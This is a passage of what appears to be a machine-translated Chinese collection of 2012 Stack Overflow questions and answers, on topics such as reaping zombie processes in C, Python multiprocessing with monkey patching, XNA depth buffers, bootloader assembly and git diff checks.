    kill(0, SIGTERM);
    printf("works");
    if (waitpid(-1, SIGCHLD, WNOHANG) < 0)
         printf("works");
} 
```

出于某种原因，“作品”甚至不会打印出来。我按 ctrl + c 退出。

我也试过-

```
prctl(PR_SET_PDEATHSIG, SIGHUP); //in child process
signal(SIGHUP, killMe);

void killMe()
{
    printf("works");
    exit(1);
} 
```

但是因为我使用的是cygwin，当我使用cygwin时`#include <sys/prctl.h>`，cygwin说它找不到文件或目录，我不知道要为它安装什么包。另外，如果我的`prctl()`功能起作用，那会杀死所有的僵尸吗？

我的程序是一个客户端服务器，我的服务器 forks() 来处理每个客户端。我想当服务器关闭时不会留下任何剩余的僵尸。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:37:41.503

你`waitpid`没有提供通常的参数，我很惊讶它没有崩溃。原型是：

```
pid_t waitpid(pid_t pid, int *status, int options); 
```

第二个参数应该是指向 的指针*，*`int`您提供的是`int`. 还要注意，你应该`waitpid`为*每个*孩子呼唤，你只是为一个孩子呼唤它。

`atexit()`仅当您正常退出时才会调用。如果您通过 CTRL+C 退出，那么您需要从 SIGINT 上的处理程序调用您的函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:33:24.340

来自 Linux 文档`atexit(3)`：

> 如果进程由于传递信号而异常终止，则不会调用使用`atexit()`(and )注册的函数。`on_exit(3)`

如果您想在应用程序收到 SIGINT 或 SIGTERM 时进行清理，您需要安装适当的信号处理程序并在那里完成您的工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T16:09:11.443

您需要跟踪您的进程有多少孩子，然后多次调用 wait 。此外，正如其他人所说，如果进程被信号终止，则不会调用您的 atexit() 函数，因此您还需要从信号处理程序中调用 killzombies() 。你需要类似的东西：

```
int n_children = 0; // global

void handle_sig(int sig) {
    killzombies();
    exit(sig);
}

// your atexit()
void killzombies() {
    kill(0, SIGKILL);
    while (n_children > 0) {
        if (wait(NULL) != -1) {
            n_children--;
        }
    }
} 
```

# java - 如何声明由 getParameterTypes() 返回的类型的变量？

> ID：12427526
> 
> 赞同：2
> 
> 时间：2012-09-14T15:24:43.563
> 
> 标签：java, generics, reflection

我想声明一个由 getParameterTypes() 返回的类型的变量，但我得到一个错误。对于 getTypeParameters() “无法解析为类型”，我也遇到了同样的错误。如何才能做到这一点？

```
 Class<?> lcSeqHolder = null;
  TypeVariable<Method> lcTypeHolder = null;

  // Use reflection to find the take method
  Method[] lcMethods = mcSpecificReader.getDeclaredMethods();
  for (Method lcMethod : lcMethods)
  {
     System.out.println(lcMethod.getName());
     if (lcMethod.getName().equals(TAKE_METHOD_NAME))
     {
        lcSeqHolder = lcMethod.getParameterTypes()[SEQUENCE_HOLDER_ARG_INDEX];
        lcTypeHolder = lcMethod.getTypeParameters()[SEQUENCE_HOLDER_ARG_INDEX];

        lcSeqHolder  var1;  // <-- lcSeqHolder cannot be resolved to a type
        lcTypeHolder  var2; // <-- lcTypeHolder cannot be resolved to a type
     }
  } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T15:30:09.680

你不能，而且几乎可以肯定不需要。变量的类型需要在*编译时*知道，显然你不知道。

大多数时候，您应该只将变量声明为类型`Object`- 毕竟，这就是您真正了解的所有内容。如果您*确实*知道更多（出于某种原因），请使用您知道的任何内容（例如某些接口）声明它们并适当地进行转换。

假设您没有更多信息，无论如何您将无法*使用*更具体的类型 - 那么您希望通过将变量声明为特定类型获得什么？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:31:26.210

Do you need an object on the type lcSeqHolder? Try this:

```
Object var1 = lcSeqHolder.newInstance(); 
```

It will only work if the class defined by lcSeqHolder has a default constructor.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:30:16.803

所有类都扩展了 Object。您可以将其设为类型。

# java - 如何在ubuntu中从java执行perl脚本

> ID：12427530
> 
> 赞同：1
> 
> 时间：2012-09-14T15:24:54.827
> 
> 标签：java, perl, ubuntu

我有一个需要运行 2 个参数的 perl 脚本。我目前正在使用 Ubuntu，我设法通过将目录更改为 perl 脚本所在的位置并编写来从终端执行 perl 脚本

```
perl tool.pl config=../mydefault.config file=../Test 
```

但是，当我尝试从我的 java 程序运行 perl 脚本（我正在使用 eclipse）时，它总是给我消息`Command Failure`。这是代码：

```
Process process;
try {
    process = Runtime.getRuntime().exec("perl /home/Leen/Desktop/Tools/bin/tool.pl config=../mydefault.config file=../Test");
    process.waitFor();
    if(process.exitValue() == 0) {
        System.out.println("Command Successful");
    } else {
        System.out.println("Command Failure");
    }
} catch(Exception e) {
    System.out.println("Exception: "+ e.toString());
} 
```

那么请问我的代码有什么问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T15:34:49.417

您应该[在对 的调用中将命令与其参数分开`exec()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html#exec%28java.lang.String%5B%5D%29)，例如：

```
Runtime.getRuntime().exec(new String[] {"perl", "/home/Leen...", "config=...", "file=..."}); 
```

使用您当前拥有的内容，运行时会查找*字面上名为* `perl /home/Leen/Desktop...`、空格和所有内容的命令。

当您从终端运行整个命令时，您的 shell 足够聪明，可以意识到空格将命令的名称 ( `perl`) 与应该传递给它的参数 ( `/home/Leen/Desktop...`, `config=...`, `file=...`) 分隔开。Runtime.exec() 并不那么聪明。

# python - Python 3：猴子补丁代码不能通过多处理重新导入

> ID：12427532
> 
> 赞同：8
> 
> 时间：2012-09-14T15:25:05.180
> 
> 标签：python, import, python-3.x, multiprocessing, monkeypatching

## 简单来说

当模块 A 的功能应该是可导入的时，我如何从模块 B 修补模块 A，以便我可以使用`multiprocessing`标准库包运行模块 A 的功能？

## 背景

一个客户请求了一个不适用于我们任何其他客户的修补程序，因此我创建了一个新分支并为他们编写了一个单独的模块，以便轻松合并来自主分支的更改。为了保持客户端与预修补程序行为的向后兼容性，我将修补程序实现为应用程序中的可配置设置。因此我不想*替换*我的旧代码——只需在打开设置时对其进行修补。我通过[猴子修补](https://stackoverflow.com/questions/717506/if-monkey-patching-is-permitted-in-both-ruby-and-python-why-is-it-more-controve)来做到这一点。

## 代码结构

`__main__`模块读入配置文件。如果配置打开了修补程序的开关，则通过用模块中定义的代码替换几个函数来`__main__`修补我的模块——本质上，被替换的[函数是最大化函数的关键函数](http://docs.python.org/py3k/library/functions.html#max)。该模块稍后会加载一个工人池。`engine``hotfix``engine`[`multiprocessing`](http://docs.python.org/py3k/library/multiprocessing.html)

## 问题

一旦`multiprocessing`工作人员开始工作，它首先`multiprocessing`会[重新导入](https://stackoverflow.com/a/7994465/1286628)*`engine`模块并查找`__main__`试图替换的关键函数（然后`multiprocessing`将控制权交给我的代码并开始最大化算法）。由于`engine`正在由一个全新的进程重新导入并且新进程不会重新运行`__main__`（读取配置文件的位置），因为这会导致无限循环，因此它不知道 re-monkey-patch `engine`。

## 问题

如何在我的代码中保持模块化（即，将修补程序代码保存在单独的模块中）并仍然利用 Python 的`multiprocessing`包？

* 请注意，我的代码必须在 Windows（对于我的客户端）和 Unix（对于我的理智......）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T06:12:25.193

这听起来像是猴子修补不起作用的地方。将相关功能提取到单独的模块并让引擎从那里导入它们更容易。也许您可以对从何处导入它们进行配置设置。

另一种模块化的方法是使用某种组件架构，比如[ZCA](http://www.muthukadan.net/docs/zca.html)。最后一个选项是我会选择的，但那是因为我已经习惯了，所以对我来说没有额外的学习。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T18:51:55.137

要使其在具有 的 UNIX/Linux 操作系统上运行`fork()`，您不需要做任何特别的事情，因为新进程可以访问与父进程相同的（猴子补丁）类。

要使其在 Windows 上运行，请让您的`__main__`模块在导入时读取配置（将`read_config`/`patch_engine`调用置于全局范围内），但在`if __name__ == '__main__'`警卫中执行多处理（引擎执行）。

`__main__`然后，无论何时导入（从命令行或从`multiprocessing`重新导入），都会执行 read-config 代码，但`if __name__ == '__main__'`仅当从命令行调用脚本时才会执行代码（因为`__main__`在不同的名称下重新导入子进程）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T22:04:46.503

听起来您将不得不修改`engine.py`以检查配置文件，并在需要时对其进行修补。

要在 unix 和 Windows 上工作，`engine`可以保留一个全局`CONFIG_DONE`变量来决定是否需要再次检查配置文件。

# c# - 如何取消任务的继续？

> ID：12427537
> 
> 赞同：5
> 
> 时间：2012-09-14T15:25:25.107
> 
> 标签：c#, asynchronous, task-parallel-library

我的类有一个`Task<int>`使用`TaskCompletionSource<int>`. 然后它执行一些异步操作并设置结果。我需要知道我是否可以信任任务的`ContinueWith`方法：

```
public Task<int> CalculateAsync()
{
    var source = new TaskCompletionSource();
    DoSomeAsyncStuffAndSetResultOf(source);

    source.Task.ContinueWith(t => Console.WriteLine("Is this reliable?"));
    return source.Task;
} 
```

方法的调用者可以`CalculateAsync`对生成的任务做一些事情并阻止其继续运行吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T15:27:36.733

您可以将 a 传递给... 的`CancellationToken`各种重载，[`ContinueWith`](http://msdn.microsoft.com/en-us/library/system.threading.tasks.task.continuewith.aspx)这将是取消延续的最惯用方式，IMO。

我认为您无法对*父*任务执行任何操作来取消继续。我有点希望不会，反正...

编辑：好的，听起来你试图*不让*这种情况发生。不，你不必担心。除非调用者能够以某种方式使任务永远运行而无需完成、被取消或出错，否则将继续运行。

# css - 使用href在点击列表上保持活跃

> ID：12427540
> 
> 赞同：1
> 
> 时间：2012-09-14T15:25:31.813
> 
> 标签：css, addclass

我有一个关于让点击的按钮/列表/锚点保持不同颜色的问题......这个问题由 FAngel 回答，我再次感谢。现在，我对同一个问题有不同的问题。

[http://jsfiddle.net/fxTQL/7/](http://jsfiddle.net/fxTQL/7/)

在这个小提琴中，效果是我想要的确切效果，但是，在我的网站上，它不起作用。我想我知道问题是什么，但我不知道如何解决它。我的网站有一个框架，如果我单击您可以在 jsfiddle 上看到的按钮，则会在其中获取主题/帖子。所以页面“刷新”并显示链接。然而，这使得不可能让点击的链接具有不同的颜色。它会自动返回到第一个列表项，该列表项已经具有背景色

我该如何解决这个问题？

这是我考虑过的。

```
<ul id="quick-index-list">
<li<? if(!$_GET['t']||$_GET['t']=='') echo ' class="active"';?>>
<a target="left" href="left">all</a>
</li> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T09:10:54.767

我看到您正在使用 PHP，因此您可以检索“t”变量的值。

您可以使用它将“活动”类分配给`li`选定的元素：

```
<ul id="quick-index-list" class="pills slim muted">
<li<? if(!$_GET['t']||$_GET['t']=='') echo ' class="active"';?>>
<a id="qindex-popular" title="alle entries" target="left" href="left.php">alles</a>
</li>
<li<? if($_GET['t']=='tod') echo ' class="active"';?>>
<a id="qindex-today" title="entries van vandaag" target="left" href="left.php?t=tod">vandaag</a>
</li>
<li class="yesterday<? if($_GET['t']=='yes') echo ' active"';?>">
<a id="qindex-yesterday" title="entries van gisteren" target="left" href="left.php?t=yes">gisteren</a>
</li>
<li<? if($_GET['t']=='mix') echo ' class="active"';?>>
<a id="qindex-day" title="willekeurige entries" target="left" href="left.php?t=mix">willekeurig</a>
</li>
</ul> 
```

因此页面加载时的“活动”类已经分配给正确`li`的：

```
<? if($_GET['t']=='tod') echo ' class="active"';?> /* default element */ 
```

或者

```
<? if($_GET['t']=='tod') echo ' class="active"';?> /* anoter element */ 
```

当您已经在 上上课时`li`，只需使用

```
<li class="yesterday<? if($_GET['t']=='yes') echo ' active"';?>"> 
```

小心在类名或类属性*之前回显空格。*希望能帮助到你

# java - 调用 phonegap 插件时出现 JSON 错误。

> ID：12427555
> 
> 赞同：2
> 
> 时间：2012-09-14T15:26:20.287
> 
> 标签：java, android, json, cordova

我在开发 iphone/ipad 应用程序时使用了 ios 的屏幕截图插件。我现在正在创建应用程序的 android 版本，并尝试实现插件的 android 版本。

我的插件的java部分看起来像这样：

```
package org.apache.cordova;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import org.apache.cordova.api.Plugin;
import org.apache.cordova.api.PluginResult;
import org.json.JSONArray;

import android.graphics.Bitmap;
import android.os.Environment;
import android.view.View;

public class Screenshot extends Plugin {
private PluginResult result = null;

@Override
public PluginResult execute(String action, JSONArray args, String callbackId) {
    // starting on ICS, some WebView methods
    // can only be called on UI threads
    super.cordova.getActivity().runOnUiThread(new Runnable() {
        public void run() {
            View view = webView.getRootView();

            view.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(view.getDrawingCache());
            view.setDrawingCacheEnabled(false);

            try {
                File folder = new File(Environment.getExternalStorageDirectory(), "Pictures");
                if (!folder.exists()) {
                    folder.mkdirs();
                }

                File f = new File(folder, "screenshot_" + System.currentTimeMillis() + ".png");

                FileOutputStream fos = new FileOutputStream(f);
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                result = new PluginResult(PluginResult.Status.OK);

            } catch (IOException e) {
                result = new PluginResult(PluginResult.Status.IO_EXCEPTION, e.getMessage());
            }
        }
    });

    // waiting ui thread to finish
    while (this.result == null) {
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            // ignoring exception, since we have to wait
            // ui thread to finish
        }
    }

    return this.result;
}

} 
```

我的 Screenshot.js 看起来像这样：

```
(function() {
/* Get local ref to global PhoneGap/Cordova/cordova object for exec function.
    - This increases the compatibility of the plugin. */
var cordovaRef = window.PhoneGap || window.Cordova || window.cordova; // old to new fallbacks

/**
 * This class exposes the ability to take a Screenshot to JavaScript
 */
function Screenshot() { }

/**
 * Save the screenshot to the user's Photo Library
 */
Screenshot.prototype.saveScreenshot = function() {
cordovaRef.exec(null, null, "Screenshot", "saveScreenshot", []);
};

    if (!window.plugins) {
        window.plugins = {};
    }
    if (!window.plugins.screenshot) {
        window.plugins.screenshot = new Screenshot();
    }

 })(); /* End of Temporary Scope. */ 
```

现在我尝试使用以下代码调用我的 screenshot.js 函数：

```
function takeScreenShot() {
  cordovaRef.exec("Screenshot.saveScreenshot");
} 
```

但是我得到的只是 JSON 错误，我知道某处我要求将其从 java 字符串转换为 JSON，但我只是不知道如何更改它。好吧，我认为这是错的......

我的错误如下所示：

```
ERROR: org.json.JSONException: Value undefined of type java.lang.String cannot be converted to JSONArray.
Error: Status=8 Message=JSON error
file:///android_asset/www/cordova-2.0.0.js: Line 938 :  Error: Status=8 Message=JSON error
Error: Status=8 Message=JSON error at file:///android_asset_/www/cordova-2.0.0.js:938 
```

谁能指导我哪里出错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T10:20:30.313

问题解决者：

[Cordova 2.0.0 中的 Phonegap Screenshot 插件](https://stackoverflow.com/questions/12424865/phonegap-screenshot-plugin-in-cordova-2-0-0)

西蒙麦克唐纳提供的答案。

# oracle - 休眠查询返回相同的行

> ID：12427558
> 
> 赞同：2
> 
> 时间：2012-09-14T15:26:34.373
> 
> 标签：oracle, hibernate

我有一个没有定义主键的 oracle 表。

消息表列如下：

```
 id - Number
 msg_number - Number
 msg_desc - Varchar2 
```

我有以下数据

```
 1234 1 Msg1
    1234 2 Msg2
    1234 1 Msg1_3
    1234 3 Msg3 
```

当我做

```
select * from myschema.message where id=1234 it returns me above four rows. 
```

当我通过 Hibernate 执行此操作时，它在列表中返回 4，但它们都是相同的行。

我需要在桌子上放一个PK吗？

这是我的查找方法

公共列表查找（长 id）{

```
 String queryString = "from Message m  where m.id=:id ORDER BY ID";

        return (List<Message>)getSessionFactory()
             .getCurrentSession()
             .createQuery(queryString)
             .setParameter("id", id).list();            

    } 
```

# xna - XNA 4.0 和无法解决的（我）深度好奇渲染

> ID：12427561
> 
> 赞同：2
> 
> 时间：2012-09-14T15:26:49.567
> 
> 标签：xna, depth-buffer, zbuffer

XNA 4.0 上关于深度问题的大头疼：

![在此处输入图像描述](../Images/8c71ead06e27b86c0aba818e71fd1b87.png)

我已经找到了许多类似问题的答案，但没有一个适合我......

设备设置如下：

```
xnaPanel1.Device.BlendState = BlendState.Opaque;                
xnaPanel1.Device.DepthStencilState = DepthStencilState.Default;
xnaPanel1.Device.PresentationParameters.DepthStencilFormat = DepthFormat.Depth24Stencil8;
[...]
Projection = Matrix.CreatePerspectiveFieldOfView(MathHelper.PiOver4, 4.0f / 3.0f, 0.1f, 1000f); 
```

作为一个残酷的问题解决者，我尝试了大多数 DepthStencilFormat 和 DepthStencilState 的可能性......没有人像我想要的那样工作。

关于投影矩阵，我也尝试了许多近剪辑和远剪辑值。（立方体宽度：10f）但无法得到正确的结果。

我已经用许多不同的纹理对此进行了测试，所有这些都是不透明的。

我不使用BasicEffect，而是使用纹理+法线贴图的效果，这可能是问题的根源吗？

**CubeEffect.fx**

```
[...]
sampler2D colorMap = sampler_state
{
Texture = <colorMapTexture>;
    MagFilter = Linear;
    MinFilter = Anisotropic;
    MipFilter = Linear;
    MaxAnisotropy = 16;
};
sampler2D normalMap = sampler_state
{
   Texture = <normalMapTexture>;
   MagFilter = Linear;
   MinFilter = Anisotropic;
   MipFilter = Linear;
   MaxAnisotropy = 16;
};
[...] 
```

编辑：我尝试了 BasicEffect 并且问题是一样的......

所以...感谢您的帮助；）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T01:01:24.773

好的，就是这样。

```
pp.DepthStencilFormat = DepthFormat.Depth24Stencil8; 
```

必须**在设备创建调用之前**。

所以我现在不知道为什么会这样：

```
Device.PresentationParameters.DepthStencilFormat = DepthFormat.Depth24Stencil8; 
```

以前在我的主要绘图函数中调用，不起作用......

**结论？**

```
PresentationParameters pp = new PresentationParameters();
pp.IsFullScreen = false;
pp.BackBufferHeight = this.renderControl.Height;
pp.BackBufferWidth = this.renderControl.Width;
pp.DeviceWindowHandle = renderControl.Handle;
pp.DepthStencilFormat = DepthFormat.Depth24Stencil8;
this.graphicsDevice = new GraphicsDevice(GraphicsAdapter.DefaultAdapter, GraphicsProfile.HiDef, pp); 
```

现在工作正常！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-15T04:28:27.560

PresentationParameters 是一个定义如何创建设备的结构。您已经看到，当您创建图形设备时，您需要传入结构，该结构仅用于初始配置。

设备将演示参数存储在其上，但除非您在设备上调用重置，否则更改它不会执行任何操作，这将重新初始化设备以使用您更改的任何参数。这是一项昂贵的操作（因此您不想经常这样做）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-15T07:26:22.173

基本上`GraphicsDevice.PresentationParameters`是一个*输出*——写入它实际上并不会改变设备状态。每当设置或重置设备时，它都会更新。

通常，您将设置`GraphicsDevice`使用`GraphicsDeviceManager`- 它为您处理设置、重置和拆卸设备。它是默认 XNA 游戏模板项目的一部分。

修改状态的正确方法是在`GraphicsDeviceManager`. 在您的情况下，您可以简单地设置`PreferredDepthStencilFormat`.

完成此操作后，您需要设置设备（即：在游戏构造函数中指定您的设置，然后 XNA 将完成其余工作），或者通过调用*重置*`GraphicsDeviceManager.ApplyChanges`设备- 您通常应该只在响应用户输入时执行此操作（显然不是每一帧）。有关详细信息，请参阅[此答案](https://stackoverflow.com/a/11287316/165500)。

* * *

您会注意到有些演示参数不能直接在`GraphicsDeviceManager`. 要更改这些，您必须将事件处理程序附加到 `GraphicsDeviceManager.PreparingDeviceSettings`. 事件参数将让您访问*可以*有效修改的演示参数版本 ( `e.GraphicsDeviceInformation.PresentationParameters`) - 其中的设置是创建图形设备时使用的设置。

# c++ - dynamic_cast 与在父类中公开虚函数（C++）

> ID：12427562
> 
> 赞同：3
> 
> 时间：2012-09-14T15:26:50.203
> 
> 标签：c++, dynamic-cast

我有一个父类“base”和另一个继承自“base”的类“派生”。

“派生”有 1 种方法 cH1。

如果我这样做：

```
base* b = new derived(); 
```

我希望能够做到这一点：

```
b->cH1(); 
```

显然我不能，有两种解决方案：

*   要么在基础中将 cH1 声明为纯虚拟。
*   或这样做：

    ```
    dynamic_cast<derived*>(b)->cH1(); 
    ```

哪一个是更好的做法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T15:32:58.710

如果`cH1`方法在语义上适用于`base`，则将其设为`base`' 方法。否则，留给`cH1`并`derived`使用`dynamic_cast`。我认为你的类的*语义*应该推动你的选择。

例如，如果您有一个基类`Vehicle`和派生类`Car`,`Motorbike`和`Aircraft`，则类似的方法具有与or`TakeOff()`兼容`Aircraft`但不兼容的语义，因此您可能希望创建一个方法，而不是方法。`Car``Motorbike``TakeOff()``Aircraft``Vehicle`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:33:38.233

首先，为了使用`dynamic_cast`，`base`必须至少有一个虚函数。

其次，使用`dynamic_cast`通常**是**设计错误的标志。如果`derived`确实是 的子级`base`，那么`derived`对象应该能够站在`base`期望对象的任何位置，这通常意味着`base`具有虚函数，无论是否纯虚函数，并且`derived`覆盖其中的部分或全部。

但是，如果不知道是什么`cH1`，就不可能推荐一种方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T15:30:02.907

`dynamic_cast`更干净，更灵活，但速度有点慢。

请记住，当您使用`dynamic_cast`检查返回的指针是否为 NULL 时。

# assembly - 汇编程序 - 理解一些行

> ID：12427571
> 
> 赞同：0
> 
> 时间：2012-09-14T15:27:13.450
> 
> 标签：assembly, nasm

在一些教程的帮助下，我写了一小段代码，在从我的软盘启动后显示一个字符串。

我现在的问题是，有些台词听不懂，我希望你能帮助我，还是告诉我，如果我是对的。

代码：

```
mov ax, 07C0h
add ax, 288         ; (512 + 4096) / 16 = 288
mov ss, ax
mov sp, 4096

mov ax, 07C0h
mov ds, ax 
```

1.  线路：启动程序@地址 07C0h（我可以改变这个吗？）
2.  为 ax 添加 288 个段落的空间
3.  ?
4.  我的程序的 4096 字节空间（用于存储变量和东西？）
5.  转到起始地址
6.  ?

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T17:48:16.947

```
mov ax, 07C0h   
add ax, 288         ; (512 + 4096) / 16 = 288
mov ss, ax 
```

这将堆栈段 (ss) 的开头放在段号 07C0h + 288 处。引导加载程序在段号 07C0h 的开头加载。引导加载程序的大小为 512 字节，每个段为 16 字节。这意味着堆栈段在引导加载程序结束后的 4096 字节处开始。

```
mov sp, 4096 
```

这将堆栈指针设置为 4096。这意味着堆栈的顶部现在比堆栈段的开头多了 4096 个字节。实际上，这为堆栈分配了 4096 个字节。

```
mov ax, 07C0h
mov ds, ax 
```

这会将数据段设置为 07C0h（引导加载程序开始的段）。当您稍后在引导加载程序中引用数据标签时，它们将使用数据段，因此您的引导加载程序必须位于数据段的开头才能在内存中找到正确的位置。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T15:36:15.917

```
mov ax, 07C0h   // copy the address 07C0h into the register ax
add ax, 288     // add the number 288 to the address in ax
mov ss, ax      // copy the result to the stack segment register (07C0h + 288)
mov sp, 4096    // set the stack pointer to 4096

mov ax, 07C0h   // copy the address 07C0h to ax again
mov ds, ax      // copy the address 07c0h from ax into ds 
```

..这就是你给的全部。

# asp.net-mvc-3 - JQGrid 排序不起作用 - MVC3

> ID：12427575
> 
> 赞同：1
> 
> 时间：2012-09-14T15:27:34.433
> 
> 标签：asp.net-mvc-3, sorting, jqgrid

我正在尝试对 JQGrid 中的每一列进行排序，但它不起作用。请参考下面的代码并帮助我

//查看代码

```
 $("#JQGridID").jqGrid({
                            url: '/Control/ActionResult/',
                            datatype: 'json',
                            mtype: 'POST',
                            colNames: ['Number', 'Unit'],
                            colModel: [
              { name: 'NNumber', index: 'Number', align: 'left', sortable: true, sorttype: 'int' },
              { name: 'NUnit', index: 'Unit', align: 'Center', sortable: true }
              ],                            pager: jQuery('#pager'),
                            cmTemplate: { title: false },
                            width: widthValue - 15,
                            height: 435,
                            rowNum: 20,
                            rowList: [20, 30, 40, 50, 60],
                            viewrecords: true,
                            gridComplete: loadCompleteFunction,
                            altRows: true,
                            sortorder: 'desc',
                            sortname: 'Number',
                            sortable: true,
                            onSortCol: function (index, idxcol, sortorder) {
                    if (this.p.lastsort >= 0 && this.p.lastsort !== idxcol
                            && this.p.colModel[this.p.lastsort].sortable !== false) {
                        $(this.grid.headers[this.p.lastsort].el).find(">div.ui-jqgrid-sortable>span.s-ico").show();
                    }
                }
,
                            onSelectRow: showMessageDetails,
                            postData: {
                        },

                        loadError: function (xml) { alert('Unable to load result data.'); }
                    }); 
```

//控制代码

```
 [HttpPost]
        public ActionResult GetSearchPositionResult(string sidx, string sord, int page, int rows)
        {
            _Object = new PositionModel();
            _Object.CurrentPage = page;
            _Object.PageRowCount = rows;
            _Object.load();
            var result = new
            {
                total = _Object.TotalPages,
                page = page,
                sort = sidx,
                sord = sord,
                records = _Object.TotalRows,
                            rows = _ObjectPM.SearchResult.Select(p => new
            {
                cell = new string[]{
                 p.Number,
                 p.Unit
                },sidx
            }).OrderBy(a => a.sidx).ToArray(),                };
            return Json(result, JsonRequestBehavior.AllowGet);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T17:19:01.340

如果`datatype: 'json'`数据的排序（`sortable: true`in `colModel`）不是由 jqGrid 在客户端处理的，但它必须由您的代码在服务器端处理。换句话说，您需要`_Object.SearchResult`按您将在参数中收到的列名对您的列名进行`sidx`排序（排序方向在`sord`参数中传递）。

在这里你可以找到一个示例项目，它可以帮助在 ASP.NET MVC 中使用 jqGrid：[jqGrid in ASP.NET MVC 3 and Razor](http://tpeczek.codeplex.com/releases/view/61796)

# javascript - 如何使用backbone.js从集合中获取模型名称

> ID：12427579
> 
> 赞同：0
> 
> 时间：2012-09-14T15:27:43.717
> 
> 标签：javascript, jquery, backbone.js

如何从集合中获取模型名称？当我定义一个集合时，我将模型属性指定为：

```
Domains = Backbone.Collection.extend({
    model : Account
}) 
```

我怎样才能得到这个属性值？

我试过Domains.model ...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:39:36.090

首先，如果您使用 String 进行初始化，我认为 Backbone 不会起作用`Collection.model`，您必须像这样指定 Model 类引用：

```
var MyModel = Backbone.Model.extend({});

var MyCollection = Backbone.Collection.extend({
    model: MyModel
}); 
```

说我不可以从变量引用本身检索变量的名称。

我建议想出一个解决方法，使用 String 类属性*标记*每个模型，您可以询问该类的名称：

```
var MyModel = Backbone.Model.extend({
    name: "MyModel"
});

var MyCollection = Backbone.Collection.extend({
    model: MyModel
});

var myCollection = new MyCollection();

console.log( "reference", myCollection.model ); // reference to the class 
console.log( "reference.name", myCollection.model.prototype.name );​ // string name 
```

检查[jsFiddle](http://jsfiddle.net/fguillen/Wdfmz/)

# git - 如何仅在某些文件类型上运行 'git diff --check'

> ID：12427583
> 
> 赞同：4
> 
> 时间：2012-09-14T15:27:53.707
> 
> 标签：git, grep, whitespace, file-extension

我一直无法弄清楚如何在我的提交中仅对 Python 文件运行“git diff --check”。我有一个包含 3 个文件的提交：

```
$ git show --name-only
...
tools/gitHooks/preReceive.py
tools/gitHooks/unittests/testPreReceive.py
Makefile 
```

最后 2 个文件中有尾随空格。

```
$ git diff --check HEAD~1 HEAD
tools/gitHooks/unittests/testPreReceive.py:75: trailing whitespace.
+newmock = Mock()
Makefile:41: new blank line at EOF. 
```

我想将空白检查限制为仅 Python 文件。这样做会给我正确的文件：

```
$ git diff --name-only HEAD~1 HEAD | grep ".py"
tools/gitHooks/preReceive.py
tools/gitHooks/unittests/testPreReceive.py 
```

但是，当我将文件名通过管道传输到“git diff --check”（有或没有 xargs）时，我得到了错误的输出。

```
$ git diff --name-only HEAD~1 HEAD | grep ".py" | xargs git diff --check HEAD~1 HEAD --
$
$ git diff --name-only HEAD~1 HEAD | grep ".py" | git diff --check HEAD~1 HEAD --
tools/gitHooks/unittests/testPreReceive.py:75: trailing whitespace.
+newmock = Mock()
Makefile:41: new blank line at EOF. 
```

我也尝试了这个以及一些没有运气的变体：

```
$ git diff --check HEAD~1 HEAD -- "*.py"
$ 
```

任何人都可以帮忙吗？我觉得我已经接近答案了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-07-08T21:54:00.533

[从原始海报](https://stackoverflow.com/revisions/12427583/3)：

原来我使用了错误的grep。

```
$ git diff --name-only HEAD~1 HEAD | grep \.py$ | \
$ xargs git diff --check HEAD~1 HEAD --
tools/gitHooks/unittests/testPreReceive.py:75: trailing whitespace.
+newmock = Mock() 
```

# python - 在 Python 中，“类名（对象）：”和“类名（）：”有什么区别？

> ID：12427584
> 
> 赞同：7
> 
> 时间：2012-09-14T15:27:54.307
> 
> 标签：python, object

下面这两个类有什么区别？你有关于这个案子的一些相关信息吗？非常感谢你。

```
class test(object):
  def __init__(self, name):
     print name

class test():
  def __init__(self, name):
     print name 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T15:41:57.003

在 python 2.x 中，继承自的类`object`将是 new-style 类，而另一个不会，而在 python 3.x 中，两者都会有 new-style。

但是新旧的区别比较大，（比如属性搜索顺序）所以初学者不用太在意不兼容的问题。

如果您有兴趣，请参阅[此答案以获取更多信息，但这对于库开发人员等来说是一件相当重要的事情。](https://stackoverflow.com/questions/54867/old-style-and-new-style-classes-in-python)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T16:32:17.460

嗯......这个维基页面非常说明性地解释了这些差异：[http ://wiki.python.org/moin/NewClassVsClassicClass](http://wiki.python.org/moin/NewClassVsClassicClass)

我看到了一些关于信息的答案，旧（经典）样式和新样式类在 py3中*是相同的 -> 这是不正确的：*

> ![在此处输入图像描述](../Images/418ed85a379e901a575def6d8b2b0b14.png) ***Python 3中删除**了旧式类，只保留了新式类的语义*

